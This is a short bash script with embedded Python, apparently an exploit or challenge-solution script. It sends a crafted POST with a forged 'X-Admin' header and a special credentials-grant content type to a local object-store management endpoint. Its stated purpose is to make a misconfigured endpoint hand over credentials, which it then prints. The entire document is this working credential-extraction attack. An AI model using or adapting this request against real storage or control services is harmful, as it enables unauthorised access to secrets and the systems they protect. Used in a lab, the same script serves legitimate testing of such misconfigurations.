#!/usr/bin/env bash
# Issue the crafted management request to the object-store control path so
# the misconfigured endpoint answers instead of refusing. Prints the HTTP
# status line and the returned credential body.
set -euo pipefail
python3 - <<'PY'
import sys
import urllib.request

req = urllib.request.Request(
    "http://127.0.0.1:8129/mgmt/token",
    data=b'{"scope":"ops"}',
    headers={
        "Content-Type": "application/x-credentials-grant",
        "X-Admin": "keys-inside-A",
    },
    method="POST",
)
try:
    resp = urllib.request.urlopen(req, timeout=10)
except urllib.error.HTTPError as e:
    print(e.code)
    print(e.read().decode())
    sys.exit(1)
print(resp.status)
print(resp.read().decode())
PY